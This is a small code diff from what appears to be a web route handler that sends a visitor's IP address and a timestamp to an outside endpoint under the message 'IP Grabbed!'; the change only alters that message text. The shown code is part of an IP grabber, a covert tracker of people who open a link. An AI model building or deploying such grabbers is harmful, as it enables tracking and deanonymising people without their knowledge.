@@ -15,7 +15,7 @@ export async function GET(request: Request) {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          content: `🕵️ **IP Grabbed!**\nIP: \`${ip}\`\nTime: ${new Date().toISOString()}`
+          content: `🕵️ **IP Grabbedd**\nIP: \`${ip}\`\nTime: ${new Date().toISOString()}`
         })
       });
     } catch (e) {
